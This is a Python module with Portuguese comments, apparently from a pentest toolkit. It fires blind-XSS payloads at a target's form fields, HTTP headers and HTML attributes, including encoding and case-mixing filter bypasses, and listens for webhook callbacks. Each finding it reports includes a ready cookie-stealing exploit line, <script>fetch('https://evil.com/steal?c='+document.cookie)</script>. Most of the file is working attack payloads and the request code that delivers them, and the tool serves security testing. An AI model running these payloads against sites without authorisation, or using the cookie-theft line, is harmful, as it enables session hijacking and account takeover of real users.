#!/usr/bin/env python3

"""Modulo de deteccao de Blind XSS via callback.



Testa se o servidor e vulneravel a Blind XSS via:

  - Input — injecao em campos de formulario

  - Header — injecao em headers (Referer, User-Agent, Cookie)

  - Attr — injecao em atributos HTML (alt, title, placeholder)

  - Event — event handlers (onerror, onload, onfocus)

  - Bypass — encoding, case, null byte tricks



Fluxo:

  1. Configura webhook para receber callbacks

  2. Injeta payloads em campos/headers/params

  3. Aguarda callbacks no webhook (configuravel)

  4. Classifica: vulnerable, blocked, error

  5. Retorna resultado consolidado com severidade

"""

import argparse
import logging
import uuid
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.blindxss")


_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "input": [
        "script_input",
        "img_input",
        "svg_input",
        "iframe_input",
        "details_input",
    ],
    "header": [
        "referer_xss",
        "useragent_xss",
        "cookie_xss",
        "xforwarded_xss",
        "custom_header_xss",
    ],
    "attr": ["alt_xss", "title_xss", "placeholder_xss", "href_xss", "src_xss"],
    "event": [
        "onerror_xss",
        "onload_xss",
        "onfocus_xss",
        "onmouseover_xss",
        "onstart_xss",
    ],
    "bypass": [
        "double_encode",
        "null_terminate",
        "case_mixed",
        "unicode_bypass",
        "whitespace_bypass",
    ],
}


def _load_category_map() -> dict[str, list[str]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "blindxss", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )

    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()


_INPUT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "script_input",
        '<script>fetch("{{callback}}")</script>',
        ["script", "callback", "xss"],
    ),
    (
        "img_input",
        "<img src=x onerror=\"fetch('{{callback}}')\">",
        ["img", "onerror", "callback"],
    ),
    (
        "svg_input",
        "<svg onload=\"fetch('{{callback}}')\">",
        ["svg", "onload", "callback"],
    ),
    (
        "iframe_input",
        "<iframe src=\"javascript:fetch('{{callback}}')\">",
        ["iframe", "javascript", "callback"],
    ),
    (
        "details_input",
        "<details open ontoggle=\"fetch('{{callback}}')\">",
        ["details", "ontoggle", "callback"],
    ),
]


def _load_input_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "blindxss",
        default={"input_payloads": [list(t) for t in _INPUT_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("input_payloads", [list(t) for t in _INPUT_PAYLOADS_DEFAULT])
    ]


_INPUT_PAYLOADS = _load_input_payloads()


_HEADER_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "referer_xss",
        "Referer",
        '<script>fetch("{{callback}}")</script>',
        ["script", "callback", "referer"],
    ),
    (
        "useragent_xss",
        "User-Agent",
        '<script>fetch("{{callback}}")</script>',
        ["script", "callback", "user-agent"],
    ),
    (
        "cookie_xss",
        "Cookie",
        'session=<script>fetch("{{callback}}")</script>',
        ["script", "cookie", "callback"],
    ),
    (
        "xforwarded_xss",
        "X-Forwarded-For",
        '<script>fetch("{{callback}}")</script>',
        ["script", "callback", "x-forwarded"],
    ),
    (
        "custom_header_xss",
        "X-Custom-Header",
        '<script>fetch("{{callback}}")</script>',
        ["script", "callback", "custom"],
    ),
]


def _load_header_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "blindxss",
        default={"header_payloads": [list(t) for t in _HEADER_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "header_payloads", [list(t) for t in _HEADER_PAYLOADS_DEFAULT]
        )
    ]


_HEADER_PAYLOADS = _load_header_payloads()


_ATTR_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "alt_xss",
        '" onerror="fetch(\'{{callback}}\')" alt="',
        ["onerror", "callback", "alt"],
    ),
    (
        "title_xss",
        '" onfocus="fetch(\'{{callback}}\')" title="',
        ["onfocus", "callback", "title"],
    ),
    (
        "placeholder_xss",
        '" onmouseover="fetch(\'{{callback}}\')" placeholder="',
        ["onmouseover", "callback", "placeholder"],
    ),
    (
        "href_xss",
        '" onclick="fetch(\'{{callback}}\')" href="',
        ["onclick", "callback", "href"],
    ),
    (
        "src_xss",
        '" onload="fetch(\'{{callback}}\')" src="',
        ["onload", "callback", "src"],
    ),
]


def _load_attr_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "blindxss",
        default={"attr_payloads": [list(t) for t in _ATTR_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("attr_payloads", [list(t) for t in _ATTR_PAYLOADS_DEFAULT])
    ]


_ATTR_PAYLOADS = _load_attr_payloads()


_EVENT_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "onerror_xss",
        '"><img src=x onerror="fetch(\'{{callback}}\')">',
        ["onerror", "callback", "img"],
    ),
    (
        "onload_xss",
        '"><svg onload="fetch(\'{{callback}}\')">',
        ["onload", "callback", "svg"],
    ),
    (
        "onfocus_xss",
        '"><input onfocus="fetch(\'{{callback}}\')" autofocus>',
        ["onfocus", "callback", "input"],
    ),
    (
        "onmouseover_xss",
        '"><div onmouseover="fetch(\'{{callback}}\')">hover</div>',
        ["onmouseover", "callback", "div"],
    ),
    (
        "onstart_xss",
        '"><marquee onstart="fetch(\'{{callback}}\')">',
        ["onstart", "callback", "marquee"],
    ),
]


def _load_event_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "blindxss",
        default={"event_payloads": [list(t) for t in _EVENT_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("event_payloads", [list(t) for t in _EVENT_PAYLOADS_DEFAULT])
    ]


_EVENT_PAYLOADS = _load_event_payloads()


_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, list[str]]] = [
    (
        "double_encode",
        "%253Cscript%253Efetch(%2522{{callback}}%252522)%253C%252Fscript%253E",
        ["script", "callback", "double"],
    ),
    (
        "null_terminate",
        '<script>fetch("{{callback}}")</script>%00',
        ["script", "callback", "null"],
    ),
    (
        "case_mixed",
        '<ScRiPt>fetch("{{callback}}")</ScRiPt>',
        ["script", "callback", "case"],
    ),
    (
        "unicode_bypass",
        "\\x3cscript\\x3efetch(\\x22{{callback}}\\x22)\\x3c/script\\x3e",
        ["script", "callback", "unicode"],
    ),
    (
        "whitespace_bypass",
        '< script > fetch ( "{{callback}}" ) < /script >',
        ["script", "callback", "whitespace"],
    ),
]


def _load_bypass_payloads() -> list[tuple[str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "blindxss",
        default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]
        )
    ]


_BYPASS_PAYLOADS = _load_bypass_payloads()


_SENSITIVE_PATHS_DEFAULT: list[str] = [
    "/contact",
    "/feedback",
    "/comment",
    "/search",
    "/login",
    "/profile",
    "/settings",
    "/admin",
    "/api/submit",
    "/form",
]


def _load_sensitive_paths() -> list[str]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "blindxss", default={"sensitive_paths": _SENSITIVE_PATHS_DEFAULT}
    )

    return data.get("sensitive_paths", _SENSITIVE_PATHS_DEFAULT)


_SENSITIVE_PATHS = _load_sensitive_paths()


def _generate_callback(webhook_url: str) -> str:
    """Gera URL de callback unica."""

    token = uuid.uuid4().hex[:8]

    return f"{webhook_url.rstrip('/')}/xss-callback/{token}"


def _check_xss_response(
    body: bytes,
    status: int,
    baseline_body: bytes,
    token: str = "",
) -> bool:
    """Verifica se a resposta indica XSS possivel.

    Indicador so conta se aparecer na resposta de teste e NAO estiver
    na resposta baseline. O token de callback unico refletido e o
    sinal mais forte de Blind XSS.
    """

    if status == 0:
        return False

    token_bytes = token.encode()

    if token_bytes and token_bytes in body and token_bytes not in baseline_body:
        return True

    text = body.decode("utf-8", errors="ignore").lower()

    baseline_text = baseline_body.decode("utf-8", errors="ignore").lower()

    xss_indicators = ["script", "onerror", "onload", "fetch", "alert", "prompt"]

    return any(ind in text and ind not in baseline_text for ind in xss_indicators)


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia request baseline para obter status e tamanho de referencia."""

    try:
        resp = await client.get(url, follow_redirects=True)

        return resp.status_code, len(resp.content), resp.content

    except httpx.RequestError:
        return 0, 0, b""


async def _test_input(
    client: httpx.AsyncClient,
    url: str,
    webhook_url: str,
    baseline: tuple[int, int, bytes],
) -> list[BlindXSSAttempt]:
    """Testa injecao de XSS em campos de formulario."""

    b_status, b_size, baseline_body = baseline

    results: list[BlindXSSAttempt] = []

    for technique, payload_template, indicators in _INPUT_PAYLOADS:
        callback_url = _generate_callback(webhook_url)

        token = callback_url.rsplit("/", 1)[-1]

        payload = payload_template.replace("{{callback}}", callback_url)

        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.post(
                    test_url,
                    content=f"input={payload}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )

                vulnerable = _check_xss_response(
                    resp.content, resp.status_code, baseline_body, token
                )

                if not vulnerable:
                    text = resp.content.decode("utf-8", errors="ignore").lower()

                    baseline_text = baseline_body.decode(
                        "utf-8", errors="ignore"
                    ).lower()

                    vulnerable = any(
                        ind.lower() in text and ind.lower() not in baseline_text
                        for ind in indicators
                    )

                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="input",
                        field="input",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, callback={callback_url}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
                        if vulnerable
                        else "",
                        tool="XSStrike",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="input",
                        field="input",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_header(
    client: httpx.AsyncClient,
    url: str,
    webhook_url: str,
    baseline: tuple[int, int, bytes],
) -> list[BlindXSSAttempt]:
    """Testa injecao de XSS em headers."""

    b_status, b_size, baseline_body = baseline

    results: list[BlindXSSAttempt] = []

    for technique, header_name, payload_template, indicators in _HEADER_PAYLOADS:
        callback_url = _generate_callback(webhook_url)

        token = callback_url.rsplit("/", 1)[-1]

        payload = payload_template.replace("{{callback}}", callback_url)

        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.get(
                    test_url,
                    headers={header_name: payload},
                    follow_redirects=True,
                )

                vulnerable = _check_xss_response(
                    resp.content, resp.status_code, baseline_body, token
                )

                if not vulnerable:
                    text = resp.content.decode("utf-8", errors="ignore").lower()

                    baseline_text = baseline_body.decode(
                        "utf-8", errors="ignore"
                    ).lower()

                    vulnerable = any(
                        ind.lower() in text and ind.lower() not in baseline_text
                        for ind in indicators
                    )

                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="header",
                        field=header_name,
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="GET",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, header={header_name}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
                        if vulnerable
                        else "",
                        tool="XSStrike",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="header",
                        field=header_name,
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="GET",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_attr(
    client: httpx.AsyncClient,
    url: str,
    webhook_url: str,
    baseline: tuple[int, int, bytes],
) -> list[BlindXSSAttempt]:
    """Testa injecao de XSS em atributos HTML."""

    b_status, b_size, baseline_body = baseline

    results: list[BlindXSSAttempt] = []

    for technique, payload_template, indicators in _ATTR_PAYLOADS:
        callback_url = _generate_callback(webhook_url)

        token = callback_url.rsplit("/", 1)[-1]

        payload = payload_template.replace("{{callback}}", callback_url)

        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.post(
                    test_url,
                    content=f"field={payload}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )

                vulnerable = _check_xss_response(
                    resp.content, resp.status_code, baseline_body, token
                )

                if not vulnerable:
                    text = resp.content.decode("utf-8", errors="ignore").lower()

                    baseline_text = baseline_body.decode(
                        "utf-8", errors="ignore"
                    ).lower()

                    vulnerable = any(
                        ind.lower() in text and ind.lower() not in baseline_text
                        for ind in indicators
                    )

                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="attr",
                        field="field",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, attr={technique}" if vulnerable else "",
                        error="",
                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
                        if vulnerable
                        else "",
                        tool="XSStrike",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="attr",
                        field="field",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_event(
    client: httpx.AsyncClient,
    url: str,
    webhook_url: str,
    baseline: tuple[int, int, bytes],
) -> list[BlindXSSAttempt]:
    """Testa injecao de XSS via event handlers."""

    b_status, b_size, baseline_body = baseline

    results: list[BlindXSSAttempt] = []

    for technique, payload_template, indicators in _EVENT_PAYLOADS:
        callback_url = _generate_callback(webhook_url)

        token = callback_url.rsplit("/", 1)[-1]

        payload = payload_template.replace("{{callback}}", callback_url)

        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.post(
                    test_url,
                    content=f"field={payload}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )

                vulnerable = _check_xss_response(
                    resp.content, resp.status_code, baseline_body, token
                )

                if not vulnerable:
                    text = resp.content.decode("utf-8", errors="ignore").lower()

                    baseline_text = baseline_body.decode(
                        "utf-8", errors="ignore"
                    ).lower()

                    vulnerable = any(
                        ind.lower() in text and ind.lower() not in baseline_text
                        for ind in indicators
                    )

                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="event",
                        field="field",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, event={technique}" if vulnerable else "",
                        error="",
                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
                        if vulnerable
                        else "",
                        tool="XSStrike",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="event",
                        field="field",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    webhook_url: str,
    baseline: tuple[int, int, bytes],
) -> list[BlindXSSAttempt]:
    """Testa bypass de XSS (encoding, null byte, etc)."""

    b_status, b_size, baseline_body = baseline

    results: list[BlindXSSAttempt] = []

    for technique, payload_template, indicators in _BYPASS_PAYLOADS:
        callback_url = _generate_callback(webhook_url)

        token = callback_url.rsplit("/", 1)[-1]

        payload = payload_template.replace("{{callback}}", callback_url)

        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.post(
                    test_url,
                    content=f"input={payload}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=True,
                )

                vulnerable = _check_xss_response(
                    resp.content, resp.status_code, baseline_body, token
                )

                if not vulnerable:
                    text = resp.content.decode("utf-8", errors="ignore").lower()

                    baseline_text = baseline_body.decode(
                        "utf-8", errors="ignore"
                    ).lower()

                    vulnerable = any(
                        ind.lower() in text and ind.lower() not in baseline_text
                        for ind in indicators
                    )

                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="bypass",
                        field="input",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, bypass={technique}"
                        if vulnerable
                        else "",
                        error="",
                        exploit="<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
                        if vulnerable
                        else "",
                        tool="XSStrike",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    BlindXSSAttempt(
                        technique=technique,
                        category="bypass",
                        field="input",
                        payload=payload[:100],
                        callback_url=callback_url,
                        method="POST",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


@dataclass(frozen=True, slots=True)
class BlindXSSAttempt:
    """Tentativa individual de Blind XSS."""

    technique: str

    category: str

    field: str

    payload: str

    callback_url: str

    method: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class BlindXSSResult:
    """Resultado consolidado do scan de Blind XSS."""

    target: str

    webhook_url: str

    baseline_status: int

    baseline_size: int

    tls: bool

    attempts: list[BlindXSSAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


def print_results(result: BlindXSSResult) -> None:
    """Exibe os resultados do scan de Blind XSS."""

    vuln = [a for a in result.attempts if a.vulnerable]

    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]

    errors = [a for a in result.attempts if a.error]

    print(color("\n--- Blind XSS via Callback ---", Cyber.CYAN, Cyber.BOLD))

    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))

    print(color(f"  Webhook:      {result.webhook_url}", Cyber.WHITE))

    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))

    print(
        color(
            f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.WHITE,
        )
    )

    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))

    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))

    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))

    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))

    if vuln:
        print(color("\n  [+] Vulnerabilidades detectadas:", Cyber.GREEN, Cyber.BOLD))

        seen: set[str] = set()

        for a in vuln:
            key = f"{a.technique}:{a.field}"

            if key in seen:
                continue

            seen.add(key)

            print(color(f"    [{a.category}] {a.technique}", Cyber.GREEN))

            print(color(f"      Field: {a.field}", Cyber.WHITE))

            print(color(f"      Payload: {a.payload}", Cyber.WHITE))

            print(color(f"      Callback: {a.callback_url}", Cyber.CYAN))

            print(
                color(
                    f"      Status: {a.status_baseline} -> {a.status_test}", Cyber.WHITE
                )
            )

            if a.details:
                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))

            print_exploit_info(a.exploit, a.tool)

        print(
            color(
                f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
                Cyber.WHITE,
            )
        )

    else:
        print(color("\n  [-] Nenhum Blind XSS detectado", Cyber.YELLOW))

    if result.issues:
        print(color("\n  [!] Observacoes:", Cyber.YELLOW))

        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))


async def run_scan(
    target: str,
    webhook_url: str,
    categories: list[str],
    timeout: float,
    output_file: str | None,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan de Blind XSS via callback."""

    logger.info("Blind XSS scan para %s (webhook: %s)", target, webhook_url)

    tls = target.startswith("https://")

    async with create_async_client(timeout=timeout, proxy=proxy) as client:
        baseline = await _test_baseline(client, target)

        b_status, b_size, _ = baseline

        all_attempts: list[BlindXSSAttempt] = []

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        for cat in test_categories:
            if cat == "input":
                all_attempts.extend(
                    await _test_input(client, target, webhook_url, baseline)
                )

            elif cat == "header":
                all_attempts.extend(
                    await _test_header(client, target, webhook_url, baseline)
                )

            elif cat == "attr":
                all_attempts.extend(
                    await _test_attr(client, target, webhook_url, baseline)
                )

            elif cat == "event":
                all_attempts.extend(
                    await _test_event(client, target, webhook_url, baseline)
                )

            elif cat == "bypass":
                all_attempts.extend(
                    await _test_bypass(client, target, webhook_url, baseline)
                )

        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})

        blocked_techs = list(
            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
        )

        issues: list[str] = []

        if not vuln_techs and not blocked_techs:
            issues.append("Nenhum teste retornou resultado claro")

        result = BlindXSSResult(
            target=target,
            webhook_url=webhook_url,
            baseline_status=b_status,
            baseline_size=b_size,
            tls=tls,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked_techs,
            issues=issues,
            overall_status="vulnerable"
            if vuln_techs
            else ("safe" if blocked_techs else "unknown"),
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)

        logger.info(
            "Blind XSS scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )

        if output_file:
            write_output(output_file, asdict(result))

            logger.info("Resultados salvos em %s", output_file)

        return 1 if vuln_techs else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""

    art = r"""

    _                        _                  ___  ________  ___

   | |                      | |                / _ \ | ___ \/ _ \

   | | _____      _____ _ __| | __ _ _   _   / /_\ \| |_/ / /_\ \

   | |/ _ \ \ /\ / / _ \ '__| |/ _` | | | | |  _  ||    /|  _  |

   | |  __/\ V  V /  __/ |  | | (_| | |_| | | | | || |\ \| | | |

   |_|\___| \_/\_/ \___|_|  |_|\__,_|\__, | \_| |/\_| \_\_| |_/

                                        __/ |

                                       |___/

"""

    create_banner(
        art, "   blind xss via callback: input, header, attr, event, bypass"
    )()


def build_parser() -> argparse.ArgumentParser:
    """Construtor do parser de argumentos."""

    parser = argparse.ArgumentParser(
        prog="mytools-blindxss",
        description="Blind XSS via callback — injeta payloads que disparam webhook.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  mytools-blindxss https://target.com --webhook https://hook.example.com\n"
            "  mytools-blindxss https://target.com --webhook https://hook.example.com -c input\n"
            "  mytools-blindxss https://target.com --webhook https://hook.example.com -c header\n"
            "  mytools-blindxss https://target.com --webhook https://hook.example.com --proxy http://127.0.0.1:8080"
        ),
    )

    parser.add_argument("url", help="URL alvo para o scan")

    parser.add_argument(
        "--webhook",
        required=True,
        help="URL do webhook para receber callbacks de XSS",
    )

    parser.add_argument(
        "-c",
        "--category",
        default="all",
        choices=["all", "input", "header", "attr", "event", "bypass"],
        help="Categoria de testes (default: todas)",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Blind XSS a partir de argumentos parseados."""

    init_scanner(args)

    logger.info("Blind XSS scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None) and args.category != "all":
        categories = [args.category]

    return safe_asyncio_run(
        run_scan(
            target=args.url,
            webhook_url=args.webhook,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            output_file=getattr(args, "output", None),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Entry point do modulo Blind XSS."""

    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="blindxss> ",
        description="Blind XSS via callback interativo.",
        example="https://target.com --webhook https://hook.example.com -c input",
        contextual_help=(
            "Uso: <url> --webhook <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com --webhook https://hook.example.com\n"
            "  https://target.com --webhook https://hook.example.com -c input\n"
            "  https://target.com --webhook https://hook.example.com -c header\n"
            "  https://target.com --webhook https://hook.example.com -c bypass\n"
            "  https://target.com --webhook https://hook.example.com --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
